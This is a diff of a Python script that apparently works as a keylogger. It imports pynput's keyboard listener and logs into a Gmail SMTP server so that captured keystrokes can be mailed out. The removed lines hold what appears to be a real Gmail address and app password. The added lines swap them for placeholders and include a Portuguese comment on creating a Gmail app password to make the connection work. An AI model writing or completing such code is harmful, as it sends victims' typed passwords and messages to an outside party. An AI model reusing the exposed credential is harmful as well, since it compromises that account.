@@ -4,10 +4,11 @@ import time
 from pynput.keyboard import Key, Listener
 from tkinter import *
 
-email = 'pentestanonymous8@gmail.com'
-password = 'dhlhcytofzhxvnpr'
+email = 'seuemail@gmail.com'
+password = 'seucodigo'
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
+#No password, no gmail, deve-se habilitar no campo 'Segurança' e em 'Chaves de acesso e de segurança', assim com o código de uma nova senha, você realiza a conexão do código com o gmail. É esse que deve ser preenchido no campo password
 
 fullog = ''
 words = ''
